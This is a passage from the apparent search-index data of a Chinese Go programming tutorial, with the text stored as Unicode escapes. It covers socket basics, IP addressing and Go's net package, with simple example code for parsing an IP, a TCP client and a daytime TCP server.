<p>SOAP\u662fW3C\u5728\u8de8\u7f51\u7edc\u4fe1\u606f\u4f20\u9012\u548c\u8fdc\u7a0b\u8ba1\u7b97\u673a\u51fd\u6570\u8c03\u7528\u65b9\u9762\u7684\u4e00\u4e2a\u6807\u51c6\u3002\u4f46\u662fSOAP\u975e\u5e38\u590d\u6742\uff0c\u5176\u5b8c\u6574\u7684\u89c4\u8303\u7bc7\u5e45\u5f88\u957f\uff0c\u800c\u4e14\u5185\u5bb9\u4ecd\u7136\u5728\u589e\u52a0\u3002Go\u8bed\u8a00\u662f\u4ee5\u7b80\u5355\u8457\u79f0\uff0c\u6240\u4ee5\u6211\u4eec\u4e0d\u4f1a\u4ecb\u7ecdSOAP\u8fd9\u6837\u590d\u6742\u7684\u4e1c\u897f\u3002\u800cGo\u8bed\u8a00\u63d0\u4f9b\u4e86\u4e00\u79cd\u5929\u751f\u6027\u80fd\u5f88\u4e0d\u9519\uff0c\u5f00\u53d1\u8d77\u6765\u5f88\u65b9\u4fbf\u7684RPC\u673a\u5236\uff0c\u6211\u4eec\u5c06\u4f1a\u57288.4\u5c0f\u8282\u8be6\u7ec6\u4ecb\u7ecd\u5982\u4f55\u4f7f\u7528Go\u8bed\u8a00\u6765\u5b9e\u73b0RPC\u3002</p> <p>Go\u8bed\u8a00\u662f21\u4e16\u7eaa\u7684C\u8bed\u8a00\uff0c\u6211\u4eec\u8ffd\u6c42\u7684\u662f\u6027\u80fd\u3001\u7b80\u5355\uff0c\u6240\u4ee5\u6211\u4eec\u57288.1\u5c0f\u8282\u91cc\u9762\u4ecb\u7ecd\u5982\u4f55\u4f7f\u7528Socket\u7f16\u7a0b\uff0c\u5f88\u591a\u6e38\u620f\u670d\u52a1\u90fd\u662f\u91c7\u7528Socket\u6765\u7f16\u5199\u670d\u52a1\u7aef\uff0c\u56e0\u4e3aHTTP\u534f\u8bae\u76f8\u5bf9\u800c\u8a00\u6bd4\u8f83\u8017\u8d39\u6027\u80fd\uff0c\u8ba9\u6211\u4eec\u770b\u770bGo\u8bed\u8a00\u5982\u4f55\u6765Socket\u7f16\u7a0b\u3002\u76ee\u524d\u968f\u7740HTML5\u7684\u53d1\u5c55\uff0cwebSockets\u4e5f\u9010\u6e10\u7684\u6210\u4e3a\u5f88\u591a\u9875\u6e38\u516c\u53f8\u63a5\u4e0b\u6765\u5f00\u53d1\u7684\u4e00\u4e9b\u624b\u6bb5\uff0c\u6211\u4eec\u5c06\u57288.2\u5c0f\u8282\u91cc\u9762\u8bb2\u89e3Go\u8bed\u8a00\u5982\u4f55\u7f16\u5199webSockets\u7684\u4ee3\u7801\u3002</p>"},{"location":"08.0/#_1","title":"\u76ee\u5f55","text":""},{"location":"08.0/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u7ae0: \u7b2c\u4e03\u7ae0\u603b\u7ed3</li> <li>\u4e0b\u4e00\u8282: Socket\u7f16\u7a0b</li> </ul>"},{"location":"08.1/","title":"8.1 Socket\u7f16\u7a0b","text":"<p>\u5728\u5f88\u591a\u5e95\u5c42\u7f51\u7edc\u5e94\u7528\u5f00\u53d1\u8005\u7684\u773c\u91cc\u4e00\u5207\u7f16\u7a0b\u90fd\u662fSocket\uff0c\u8bdd\u867d\u7136\u6709\u70b9\u5938\u5f20\uff0c\u4f46\u5374\u4e5f\u51e0\u4e4e\u5982\u6b64\u4e86\uff0c\u73b0\u5728\u7684\u7f51\u7edc\u7f16\u7a0b\u51e0\u4e4e\u90fd\u662f\u7528Socket\u6765\u7f16\u7a0b\u3002\u4f60\u60f3\u8fc7\u8fd9\u4e9b\u60c5\u666f\u4e48\uff1f\u6211\u4eec\u6bcf\u5929\u6253\u5f00\u6d4f\u89c8\u5668\u6d4f\u89c8\u7f51\u9875\u65f6\uff0c\u6d4f\u89c8\u5668\u8fdb\u7a0b\u600e\u4e48\u548cWeb\u670d\u52a1\u5668\u8fdb\u884c\u901a\u4fe1\u7684\u5462\uff1f\u5f53\u4f60\u7528QQ\u804a\u5929\u65f6\uff0cQQ\u8fdb\u7a0b\u600e\u4e48\u548c\u670d\u52a1\u5668\u6216\u8005\u662f\u4f60\u7684\u597d\u53cb\u6240\u5728\u7684QQ\u8fdb\u7a0b\u8fdb\u884c\u901a\u4fe1\u7684\u5462\uff1f\u5f53\u4f60\u6253\u5f00PPstream\u89c2\u770b\u89c6\u9891\u65f6\uff0cPPstream\u8fdb\u7a0b\u5982\u4f55\u4e0e\u89c6\u9891\u670d\u52a1\u5668\u8fdb\u884c\u901a\u4fe1\u7684\u5462\uff1f \u5982\u6b64\u79cd\u79cd\uff0c\u90fd\u662f\u9760Socket\u6765\u8fdb\u884c\u901a\u4fe1\u7684\uff0c\u4ee5\u4e00\u6591\u7aa5\u5168\u8c79\uff0c\u53ef\u89c1Socket\u7f16\u7a0b\u5728\u73b0\u4ee3\u7f16\u7a0b\u4e2d\u5360\u636e\u4e86\u591a\u4e48\u91cd\u8981\u7684\u5730\u4f4d\uff0c\u8fd9\u4e00\u8282\u6211\u4eec\u5c06\u4ecb\u7ecdGo\u8bed\u8a00\u4e2d\u5982\u4f55\u8fdb\u884cSocket\u7f16\u7a0b\u3002</p>"},{"location":"08.1/#socket","title":"\u4ec0\u4e48\u662fSocket\uff1f","text":"<p>Socket\u8d77\u6e90\u4e8eUnix\uff0c\u800cUnix\u57fa\u672c\u54f2\u5b66\u4e4b\u4e00\u5c31\u662f\u201c\u4e00\u5207\u7686\u6587\u4ef6\u201d\uff0c\u90fd\u53ef\u4ee5\u7528\u201c\u6253\u5f00open \u2013&gt; \u8bfb\u5199write/read \u2013&gt; \u5173\u95edclose\u201d\u6a21\u5f0f\u6765\u64cd\u4f5c\u3002Socket\u5c31\u662f\u8be5\u6a21\u5f0f\u7684\u4e00\u4e2a\u5b9e\u73b0\uff0c\u7f51\u7edc\u7684Socket\u6570\u636e\u4f20\u8f93\u662f\u4e00\u79cd\u7279\u6b8a\u7684I/O\uff0cSocket\u4e5f\u662f\u4e00\u79cd\u6587\u4ef6\u63cf\u8ff0\u7b26\u3002Socket\u4e5f\u5177\u6709\u4e00\u4e2a\u7c7b\u4f3c\u4e8e\u6253\u5f00\u6587\u4ef6\u7684\u51fd\u6570\u8c03\u7528\uff1aSocket()\uff0c\u8be5\u51fd\u6570\u8fd4\u56de\u4e00\u4e2a\u6574\u578b\u7684Socket\u63cf\u8ff0\u7b26\uff0c\u968f\u540e\u7684\u8fde\u63a5\u5efa\u7acb\u3001\u6570\u636e\u4f20\u8f93\u7b49\u64cd\u4f5c\u90fd\u662f\u901a\u8fc7\u8be5Socket\u5b9e\u73b0\u7684\u3002</p> <p>\u5e38\u7528\u7684Socket\u7c7b\u578b\u6709\u4e24\u79cd\uff1a\u6d41\u5f0fSocket\uff08SOCK_STREAM\uff09\u548c\u6570\u636e\u62a5\u5f0fSocket\uff08SOCK_DGRAM\uff09\u3002\u6d41\u5f0f\u662f\u4e00\u79cd\u9762\u5411\u8fde\u63a5\u7684Socket\uff0c\u9488\u5bf9\u4e8e\u9762\u5411\u8fde\u63a5\u7684TCP\u670d\u52a1\u5e94\u7528\uff1b\u6570\u636e\u62a5\u5f0fSocket\u662f\u4e00\u79cd\u65e0\u8fde\u63a5\u7684Socket\uff0c\u5bf9\u5e94\u4e8e\u65e0\u8fde\u63a5\u7684UDP\u670d\u52a1\u5e94\u7528\u3002</p>"},{"location":"08.1/#socket_1","title":"Socket\u5982\u4f55\u901a\u4fe1","text":"<p>\u7f51\u7edc\u4e2d\u7684\u8fdb\u7a0b\u4e4b\u95f4\u5982\u4f55\u901a\u8fc7Socket\u901a\u4fe1\u5462\uff1f\u9996\u8981\u89e3\u51b3\u7684\u95ee\u9898\u662f\u5982\u4f55\u552f\u4e00\u6807\u8bc6\u4e00\u4e2a\u8fdb\u7a0b\uff0c\u5426\u5219\u901a\u4fe1\u65e0\u4ece\u8c08\u8d77\uff01\u5728\u672c\u5730\u53ef\u4ee5\u901a\u8fc7\u8fdb\u7a0bPID\u6765\u552f\u4e00\u6807\u8bc6\u4e00\u4e2a\u8fdb\u7a0b\uff0c\u4f46\u662f\u5728\u7f51\u7edc\u4e2d\u8fd9\u662f\u884c\u4e0d\u901a\u7684\u3002\u5176\u5b9eTCP/IP\u534f\u8bae\u65cf\u5df2\u7ecf\u5e2e\u6211\u4eec\u89e3\u51b3\u4e86\u8fd9\u4e2a\u95ee\u9898\uff0c\u7f51\u7edc\u5c42\u7684\u201cip\u5730\u5740\u201d\u53ef\u4ee5\u552f\u4e00\u6807\u8bc6\u7f51\u7edc\u4e2d\u7684\u4e3b\u673a\uff0c\u800c\u4f20\u8f93\u5c42\u7684\u201c\u534f\u8bae+\u7aef\u53e3\u201d\u53ef\u4ee5\u552f\u4e00\u6807\u8bc6\u4e3b\u673a\u4e2d\u7684\u5e94\u7528\u7a0b\u5e8f\uff08\u8fdb\u7a0b\uff09\u3002\u8fd9\u6837\u5229\u7528\u4e09\u5143\u7ec4\uff08ip\u5730\u5740\uff0c\u534f\u8bae\uff0c\u7aef\u53e3\uff09\u5c31\u53ef\u4ee5\u6807\u8bc6\u7f51\u7edc\u7684\u8fdb\u7a0b\u4e86\uff0c\u7f51\u7edc\u4e2d\u9700\u8981\u4e92\u76f8\u901a\u4fe1\u7684\u8fdb\u7a0b\uff0c\u5c31\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u6807\u5fd7\u5728\u4ed6\u4eec\u4e4b\u95f4\u8fdb\u884c\u4ea4\u4e92\u3002\u8bf7\u770b\u4e0b\u9762\u8fd9\u4e2aTCP/IP\u534f\u8bae\u7ed3\u6784\u56fe</p> <p></p> <p>\u56fe8.1 \u4e03\u5c42\u7f51\u7edc\u534f\u8bae\u56fe</p> <p>\u4f7f\u7528TCP/IP\u534f\u8bae\u7684\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u91c7\u7528\u5e94\u7528\u7f16\u7a0b\u63a5\u53e3\uff1aUNIX BSD\u7684\u5957\u63a5\u5b57\uff08socket\uff09\u548cUNIX System V\u7684TLI\uff08\u5df2\u7ecf\u88ab\u6dd8\u6c70\uff09\uff0c\u6765\u5b9e\u73b0\u7f51\u7edc\u8fdb\u7a0b\u4e4b\u95f4\u7684\u901a\u4fe1\u3002\u5c31\u76ee\u524d\u800c\u8a00\uff0c\u51e0\u4e4e\u6240\u6709\u7684\u5e94\u7528\u7a0b\u5e8f\u90fd\u662f\u91c7\u7528socket\uff0c\u800c\u73b0\u5728\u53c8\u662f\u7f51\u7edc\u65f6\u4ee3\uff0c\u7f51\u7edc\u4e2d\u8fdb\u7a0b\u901a\u4fe1\u662f\u65e0\u5904\u4e0d\u5728\uff0c\u8fd9\u5c31\u662f\u4e3a\u4ec0\u4e48\u8bf4\u201c\u4e00\u5207\u7686Socket\u201d\u3002</p>"},{"location":"08.1/#socket_2","title":"Socket\u57fa\u7840\u77e5\u8bc6","text":"<p>\u901a\u8fc7\u4e0a\u9762\u7684\u4ecb\u7ecd\u6211\u4eec\u77e5\u9053Socket\u6709\u4e24\u79cd\uff1aTCP Socket\u548cUDP Socket\uff0cTCP\u548cUDP\u662f\u534f\u8bae\uff0c\u800c\u8981\u786e\u5b9a\u4e00\u4e2a\u8fdb\u7a0b\u7684\u9700\u8981\u4e09\u5143\u7ec4\uff0c\u9700\u8981IP\u5730\u5740\u548c\u7aef\u53e3\u3002</p>"},{"location":"08.1/#ipv4","title":"IPv4\u5730\u5740","text":"<p>\u76ee\u524d\u7684\u5168\u7403\u56e0\u7279\u7f51\u6240\u91c7\u7528\u7684\u534f\u8bae\u65cf\u662fTCP/IP\u534f\u8bae\u3002IP\u662fTCP/IP\u534f\u8bae\u4e2d\u7f51\u7edc\u5c42\u7684\u534f\u8bae\uff0c\u662fTCP/IP\u534f\u8bae\u65cf\u7684\u6838\u5fc3\u534f\u8bae\u3002\u76ee\u524d\u4e3b\u8981\u91c7\u7528\u7684IP\u534f\u8bae\u7684\u7248\u672c\u53f7\u662f4(\u7b80\u79f0\u4e3aIPv4)\uff0c\u53d1\u5c55\u81f3\u4eca\u5df2\u7ecf\u4f7f\u7528\u4e8630\u591a\u5e74\u3002</p> <p>IPv4\u7684\u5730\u5740\u4f4d\u6570\u4e3a32\u4f4d\uff0c\u4e5f\u5c31\u662f\u6700\u591a\u67092\u768432\u6b21\u65b9\u7684\u7f51\u7edc\u8bbe\u5907\u53ef\u4ee5\u8054\u5230Internet\u4e0a\u3002\u8fd1\u5341\u5e74\u6765\u7531\u4e8e\u4e92\u8054\u7f51\u7684\u84ec\u52c3\u53d1\u5c55\uff0cIP\u4f4d\u5740\u7684\u9700\u6c42\u91cf\u6108\u6765\u6108\u5927\uff0c\u4f7f\u5f97IP\u4f4d\u5740\u7684\u53d1\u653e\u6108\u8d8b\u7d27\u5f20\uff0c\u524d\u4e00\u6bb5\u65f6\u95f4\uff0c\u636e\u62a5\u9053IPV4\u7684\u5730\u5740\u5df2\u7ecf\u53d1\u653e\u5b8c\u6bd5\uff0c\u6211\u4eec\u516c\u53f8\u76ee\u524d\u5f88\u591a\u670d\u52a1\u5668\u7684IP\u90fd\u662f\u4e00\u4e2a\u5b9d\u8d35\u7684\u8d44\u6e90\u3002</p> <p>\u5730\u5740\u683c\u5f0f\u7c7b\u4f3c\u8fd9\u6837\uff1a127.0.0.1 172.122.121.111</p>"},{"location":"08.1/#ipv6","title":"IPv6\u5730\u5740","text":"<p>IPv6\u662f\u4e0b\u4e00\u7248\u672c\u7684\u4e92\u8054\u7f51\u534f\u8bae\uff0c\u4e5f\u53ef\u4ee5\u8bf4\u662f\u4e0b\u4e00\u4ee3\u4e92\u8054\u7f51\u7684\u534f\u8bae\uff0c\u5b83\u662f\u4e3a\u4e86\u89e3\u51b3IPv4\u5728\u5b9e\u65bd\u8fc7\u7a0b\u4e2d\u9047\u5230\u7684\u5404\u79cd\u95ee\u9898\u800c\u88ab\u63d0\u51fa\u7684\uff0cIPv6\u91c7\u7528128\u4f4d\u5730\u5740\u957f\u5ea6\uff0c\u51e0\u4e4e\u53ef\u4ee5\u4e0d\u53d7\u9650\u5236\u5730\u63d0\u4f9b\u5730\u5740\u3002\u6309\u4fdd\u5b88\u65b9\u6cd5\u4f30\u7b97IPv6\u5b9e\u9645\u53ef\u5206\u914d\u7684\u5730\u5740\uff0c\u6574\u4e2a\u5730\u7403\u7684\u6bcf\u5e73\u65b9\u7c73\u9762\u79ef\u4e0a\u4ecd\u53ef\u5206\u914d1000\u591a\u4e2a\u5730\u5740\u3002\u5728IPv6\u7684\u8bbe\u8ba1\u8fc7\u7a0b\u4e2d\u9664\u4e86\u4e00\u52b3\u6c38\u9038\u5730\u89e3\u51b3\u4e86\u5730\u5740\u77ed\u7f3a\u95ee\u9898\u4ee5\u5916\uff0c\u8fd8\u8003\u8651\u4e86\u5728IPv4\u4e2d\u89e3\u51b3\u4e0d\u597d\u7684\u5176\u5b83\u95ee\u9898\uff0c\u4e3b\u8981\u6709\u7aef\u5230\u7aefIP\u8fde\u63a5\u3001\u670d\u52a1\u8d28\u91cf\uff08QoS\uff09\u3001\u5b89\u5168\u6027\u3001\u591a\u64ad\u3001\u79fb\u52a8\u6027\u3001\u5373\u63d2\u5373\u7528\u7b49\u3002</p> <p>\u5730\u5740\u683c\u5f0f\u7c7b\u4f3c\u8fd9\u6837\uff1a2002:c0e8:82e7:0:0:0:c0e8:82e7</p>"},{"location":"08.1/#goip","title":"Go\u652f\u6301\u7684IP\u7c7b\u578b","text":"<p>\u5728Go\u7684<code>net</code>\u5305\u4e2d\u5b9a\u4e49\u4e86\u5f88\u591a\u7c7b\u578b\u3001\u51fd\u6570\u548c\u65b9\u6cd5\u7528\u6765\u7f51\u7edc\u7f16\u7a0b\uff0c\u5176\u4e2dIP\u7684\u5b9a\u4e49\u5982\u4e0b\uff1a <pre><code>type IP []byte\n</code></pre> \u5728<code>net</code>\u5305\u4e2d\u6709\u5f88\u591a\u51fd\u6570\u6765\u64cd\u4f5cIP\uff0c\u4f46\u662f\u5176\u4e2d\u6bd4\u8f83\u6709\u7528\u7684\u4e5f\u5c31\u51e0\u4e2a\uff0c\u5176\u4e2d<code>ParseIP(s string) IP</code>\u51fd\u6570\u4f1a\u628a\u4e00\u4e2aIPv4\u6216\u8005IPv6\u7684\u5730\u5740\u8f6c\u5316\u6210IP\u7c7b\u578b\uff0c\u8bf7\u770b\u4e0b\u9762\u7684\u4f8b\u5b50:</p> <p><pre><code>package main\nimport (\n\"net\"\n\"os\"\n\"fmt\"\n)\nfunc main() {\nif len(os.Args) != 2 {\nfmt.Fprintf(os.Stderr, \"Usage: %s ip-addr\\n\", os.Args[0])\nos.Exit(1)\n}\nname := os.Args[1]\naddr := net.ParseIP(name)\nif addr == nil {\nfmt.Println(\"Invalid address\")\n} else {\nfmt.Println(\"The address is \", addr.String())\n}\nos.Exit(0)\n}\n</code></pre> \u6267\u884c\u4e4b\u540e\u4f60\u5c31\u4f1a\u53d1\u73b0\u53ea\u8981\u4f60\u8f93\u5165\u4e00\u4e2aIP\u5730\u5740\u5c31\u4f1a\u7ed9\u51fa\u76f8\u5e94\u7684IP\u683c\u5f0f</p>"},{"location":"08.1/#tcp-socket","title":"TCP Socket","text":"<p>\u5f53\u6211\u4eec\u77e5\u9053\u5982\u4f55\u901a\u8fc7\u7f51\u7edc\u7aef\u53e3\u8bbf\u95ee\u4e00\u4e2a\u670d\u52a1\u65f6\uff0c\u90a3\u4e48\u6211\u4eec\u80fd\u591f\u505a\u4ec0\u4e48\u5462\uff1f\u4f5c\u4e3a\u5ba2\u6237\u7aef\u6765\u8bf4\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5411\u8fdc\u7aef\u67d0\u53f0\u673a\u5668\u7684\u7684\u67d0\u4e2a\u7f51\u7edc\u7aef\u53e3\u53d1\u9001\u4e00\u4e2a\u8bf7\u6c42\uff0c\u7136\u540e\u5f97\u5230\u5728\u673a\u5668\u7684\u6b64\u7aef\u53e3\u4e0a\u76d1\u542c\u7684\u670d\u52a1\u53cd\u9988\u7684\u4fe1\u606f\u3002\u4f5c\u4e3a\u670d\u52a1\u7aef\uff0c\u6211\u4eec\u9700\u8981\u628a\u670d\u52a1\u7ed1\u5b9a\u5230\u67d0\u4e2a\u6307\u5b9a\u7aef\u53e3\uff0c\u5e76\u4e14\u5728\u6b64\u7aef\u53e3\u4e0a\u76d1\u542c\uff0c\u5f53\u6709\u5ba2\u6237\u7aef\u6765\u8bbf\u95ee\u65f6\u80fd\u591f\u8bfb\u53d6\u4fe1\u606f\u5e76\u4e14\u5199\u5165\u53cd\u9988\u4fe1\u606f\u3002</p> <p>\u5728Go\u8bed\u8a00\u7684<code>net</code>\u5305\u4e2d\u6709\u4e00\u4e2a\u7c7b\u578b<code>TCPConn</code>\uff0c\u8fd9\u4e2a\u7c7b\u578b\u53ef\u4ee5\u7528\u6765\u4f5c\u4e3a\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u7aef\u4ea4\u4e92\u7684\u901a\u9053\uff0c\u4ed6\u6709\u4e24\u4e2a\u4e3b\u8981\u7684\u51fd\u6570\uff1a</p> <pre><code>func (c *TCPConn) Write(b []byte) (int, error)\nfunc (c *TCPConn) Read(b []byte) (int, error)\n</code></pre> <p><code>TCPConn</code>\u53ef\u4ee5\u7528\u5728\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u7aef\u6765\u8bfb\u5199\u6570\u636e\u3002</p> <p>\u8fd8\u6709\u6211\u4eec\u9700\u8981\u77e5\u9053\u4e00\u4e2a<code>TCPAddr</code>\u7c7b\u578b\uff0c\u4ed6\u8868\u793a\u4e00\u4e2aTCP\u7684\u5730\u5740\u4fe1\u606f\uff0c\u4ed6\u7684\u5b9a\u4e49\u5982\u4e0b\uff1a</p> <p><pre><code>type TCPAddr struct {\nIP IP\nPort int\nZone string // IPv6 scoped addressing zone\n}\n</code></pre> \u5728Go\u8bed\u8a00\u4e2d\u901a\u8fc7<code>ResolveTCPAddr</code>\u83b7\u53d6\u4e00\u4e2a<code>TCPAddr</code></p> <pre><code>func ResolveTCPAddr(net, addr string) (*TCPAddr, os.Error)\n</code></pre> <ul> <li>net\u53c2\u6570\u662f\"tcp4\"\u3001\"tcp6\"\u3001\"tcp\"\u4e2d\u7684\u4efb\u610f\u4e00\u4e2a\uff0c\u5206\u522b\u8868\u793aTCP(IPv4-only), TCP(IPv6-only)\u6216\u8005TCP(IPv4, IPv6\u7684\u4efb\u610f\u4e00\u4e2a)\u3002</li> <li>addr\u8868\u793a\u57df\u540d\u6216\u8005IP\u5730\u5740\uff0c\u4f8b\u5982\"www.google.com:80\" \u6216\u8005\"127.0.0.1:22\"\u3002</li> </ul>"},{"location":"08.1/#tcp-client","title":"TCP client","text":"<p>Go\u8bed\u8a00\u4e2d\u901a\u8fc7net\u5305\u4e2d\u7684<code>DialTCP</code>\u51fd\u6570\u6765\u5efa\u7acb\u4e00\u4e2aTCP\u8fde\u63a5\uff0c\u5e76\u8fd4\u56de\u4e00\u4e2a<code>TCPConn</code>\u7c7b\u578b\u7684\u5bf9\u8c61\uff0c\u5f53\u8fde\u63a5\u5efa\u7acb\u65f6\u670d\u52a1\u5668\u7aef\u4e5f\u521b\u5efa\u4e00\u4e2a\u540c\u7c7b\u578b\u7684\u5bf9\u8c61\uff0c\u6b64\u65f6\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u7aef\u901a\u8fc7\u5404\u81ea\u62e5\u6709\u7684<code>TCPConn</code>\u5bf9\u8c61\u6765\u8fdb\u884c\u6570\u636e\u4ea4\u6362\u3002\u4e00\u822c\u800c\u8a00\uff0c\u5ba2\u6237\u7aef\u901a\u8fc7<code>TCPConn</code>\u5bf9\u8c61\u5c06\u8bf7\u6c42\u4fe1\u606f\u53d1\u9001\u5230\u670d\u52a1\u5668\u7aef\uff0c\u8bfb\u53d6\u670d\u52a1\u5668\u7aef\u54cd\u5e94\u7684\u4fe1\u606f\u3002\u670d\u52a1\u5668\u7aef\u8bfb\u53d6\u5e76\u89e3\u6790\u6765\u81ea\u5ba2\u6237\u7aef\u7684\u8bf7\u6c42\uff0c\u5e76\u8fd4\u56de\u5e94\u7b54\u4fe1\u606f\uff0c\u8fd9\u4e2a\u8fde\u63a5\u53ea\u6709\u5f53\u4efb\u4e00\u7aef\u5173\u95ed\u4e86\u8fde\u63a5\u4e4b\u540e\u624d\u5931\u6548\uff0c\u4e0d\u7136\u8fd9\u8fde\u63a5\u53ef\u4ee5\u4e00\u76f4\u5728\u4f7f\u7528\u3002\u5efa\u7acb\u8fde\u63a5\u7684\u51fd\u6570\u5b9a\u4e49\u5982\u4e0b\uff1a</p> <p><pre><code>func DialTCP(network string, laddr, raddr *TCPAddr) (*TCPConn, error)\n</code></pre> - network\u53c2\u6570\u662f\"tcp4\"\u3001\"tcp6\"\u3001\"tcp\"\u4e2d\u7684\u4efb\u610f\u4e00\u4e2a\uff0c\u5206\u522b\u8868\u793aTCP(IPv4-only)\u3001TCP(IPv6-only)\u6216\u8005TCP(IPv4,IPv6\u7684\u4efb\u610f\u4e00\u4e2a) - laddr\u8868\u793a\u672c\u673a\u5730\u5740\uff0c\u4e00\u822c\u8bbe\u7f6e\u4e3anil - raddr\u8868\u793a\u8fdc\u7a0b\u7684\u670d\u52a1\u5730\u5740</p> <p>\u63a5\u4e0b\u6765\u6211\u4eec\u5199\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\uff0c\u6a21\u62df\u4e00\u4e2a\u57fa\u4e8eHTTP\u534f\u8bae\u7684\u5ba2\u6237\u7aef\u8bf7\u6c42\u53bb\u8fde\u63a5\u4e00\u4e2aWeb\u670d\u52a1\u7aef\u3002\u6211\u4eec\u8981\u5199\u4e00\u4e2a\u7b80\u5355\u7684http\u8bf7\u6c42\u5934\uff0c\u683c\u5f0f\u7c7b\u4f3c\u5982\u4e0b\uff1a</p> <pre><code>\"HEAD / HTTP/1.0\\r\\n\\r\\n\"\n</code></pre> <p>\u4ece\u670d\u52a1\u7aef\u63a5\u6536\u5230\u7684\u54cd\u5e94\u4fe1\u606f\u683c\u5f0f\u53ef\u80fd\u5982\u4e0b\uff1a <pre><code>HTTP/1.0 200 OK\nETag: \"-9985996\"\nLast-Modified: Thu, 25 Mar 2010 17:51:10 GMT\nContent-Length: 18074\nConnection: close\nDate: Sat, 28 Aug 2010 00:43:48 GMT\nServer: lighttpd/1.4.23\n</code></pre> \u6211\u4eec\u7684\u5ba2\u6237\u7aef\u4ee3\u7801\u5982\u4e0b\u6240\u793a\uff1a <pre><code>package main\n\nimport (\n\"fmt\"\n\"io/ioutil\"\n\"net\"\n\"os\"\n)\n\nfunc main() {\nif len(os.Args) != 2 {\nfmt.Fprintf(os.Stderr, \"Usage: %s host:port \", os.Args[0])\nos.Exit(1)\n}\nservice := os.Args[1]\ntcpAddr, err := net.ResolveTCPAddr(\"tcp4\", service)\ncheckError(err)\nconn, err := net.DialTCP(\"tcp\", nil, tcpAddr)\ncheckError(err)\n_, err = conn.Write([]byte(\"HEAD / HTTP/1.0\\r\\n\\r\\n\"))\ncheckError(err)\n// result, err := ioutil.ReadAll(conn)\nresult := make([]byte, 256)\n_, err = conn.Read(result)\ncheckError(err)\nfmt.Println(string(result))\nos.Exit(0)\n}\nfunc checkError(err error) {\nif err != nil {\nfmt.Fprintf(os.Stderr, \"Fatal error: %s\", err.Error())\nos.Exit(1)\n}\n}\n</code></pre> \u901a\u8fc7\u4e0a\u9762\u7684\u4ee3\u7801\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\uff1a\u9996\u5148\u7a0b\u5e8f\u5c06\u7528\u6237\u7684\u8f93\u5165\u4f5c\u4e3a\u53c2\u6570<code>service</code>\u4f20\u5165<code>net.ResolveTCPAddr</code>\u83b7\u53d6\u4e00\u4e2atcpAddr,\u7136\u540e\u628atcpAddr\u4f20\u5165DialTCP\u540e\u521b\u5efa\u4e86\u4e00\u4e2aTCP\u8fde\u63a5<code>conn</code>\uff0c\u901a\u8fc7<code>conn</code>\u6765\u53d1\u9001\u8bf7\u6c42\u4fe1\u606f\uff0c\u6700\u540e\u901a\u8fc7<code>ioutil.ReadAll</code>\u4ece<code>conn</code>\u4e2d\u8bfb\u53d6\u5168\u90e8\u7684\u6587\u672c\uff0c\u4e5f\u5c31\u662f\u670d\u52a1\u7aef\u54cd\u5e94\u53cd\u9988\u7684\u4fe1\u606f\u3002</p>"},{"location":"08.1/#tcp-server","title":"TCP server","text":"<p>\u4e0a\u9762\u6211\u4eec\u7f16\u5199\u4e86\u4e00\u4e2aTCP\u7684\u5ba2\u6237\u7aef\u7a0b\u5e8f\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7net\u5305\u6765\u521b\u5efa\u4e00\u4e2a\u670d\u52a1\u5668\u7aef\u7a0b\u5e8f\uff0c\u5728\u670d\u52a1\u5668\u7aef\u6211\u4eec\u9700\u8981\u7ed1\u5b9a\u670d\u52a1\u5230\u6307\u5b9a\u7684\u975e\u6fc0\u6d3b\u7aef\u53e3\uff0c\u5e76\u76d1\u542c\u6b64\u7aef\u53e3\uff0c\u5f53\u6709\u5ba2\u6237\u7aef\u8bf7\u6c42\u5230\u8fbe\u7684\u65f6\u5019\u53ef\u4ee5\u63a5\u6536\u5230\u6765\u81ea\u5ba2\u6237\u7aef\u8fde\u63a5\u7684\u8bf7\u6c42\u3002net\u5305\u4e2d\u6709\u76f8\u5e94\u529f\u80fd\u7684\u51fd\u6570\uff0c\u51fd\u6570\u5b9a\u4e49\u5982\u4e0b\uff1a <pre><code>func ListenTCP(network string, laddr *TCPAddr) (*TCPListener, error)\nfunc (l *TCPListener) Accept() (Conn, error)\n</code></pre> \u53c2\u6570\u8bf4\u660e\u540cDialTCP\u7684\u53c2\u6570\u4e00\u6837\u3002\u4e0b\u9762\u6211\u4eec\u5b9e\u73b0\u4e00\u4e2a\u7b80\u5355\u7684\u65f6\u95f4\u540c\u6b65\u670d\u52a1\uff0c\u76d1\u542c7777\u7aef\u53e3 <pre><code>package main\n\nimport (\n\"fmt\"\n\"net\"\n\"os\"\n\"time\"\n)\n\nfunc main() {\nservice := \":7777\"\ntcpAddr, err := net.ResolveTCPAddr(\"tcp4\", service)\ncheckError(err)\nlistener, err := net.ListenTCP(\"tcp\", tcpAddr)\ncheckError(err)\nfor {\nconn, err := listener.Accept()\nif err != nil {\ncontinue\n}\ndaytime := time.Now().String()\nconn.Write([]byte(daytime)) // don't care about return value\nconn.Close()                // we're finished with this client\n}\n}\nfunc checkError(err error) {\nif err != nil {\nfmt.Fprintf(os.Stderr, \"Fatal error: %s\", err.Error())\nos.Exit(1)\n}\n}\n</code></pre> \u4e0a\u9762\u7684\u670d\u52a1\u8dd1\u8d77\u6765\u4e4b\u540e\uff0c\u5b83\u5c06\u4f1a\u4e00\u76f4\u5728\u90a3\u91cc\u7b49\u5f85\uff0c\u76f4\u5230\u6709\u65b0\u7684\u5ba2\u6237\u7aef\u8bf7\u6c42\u5230\u8fbe\u3002\u5f53\u6709\u65b0\u7684\u5ba2\u6237\u7aef\u8bf7\u6c42\u5230\u8fbe\u5e76\u540c\u610f\u63a5\u53d7<code>Accept</code>\u8be5\u8bf7\u6c42\u7684\u65f6\u5019\u4ed6\u4f1a\u53cd\u9988\u5f53\u524d\u7684\u65f6\u95f4\u4fe1\u606f\u3002\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u5728\u4ee3\u7801\u4e2d<code>for</code>\u5faa\u73af\u91cc\uff0c\u5f53\u6709\u9519\u8bef\u53d1\u751f\u65f6\uff0c\u76f4\u63a5continue\u800c\u4e0d\u662f\u9000\u51f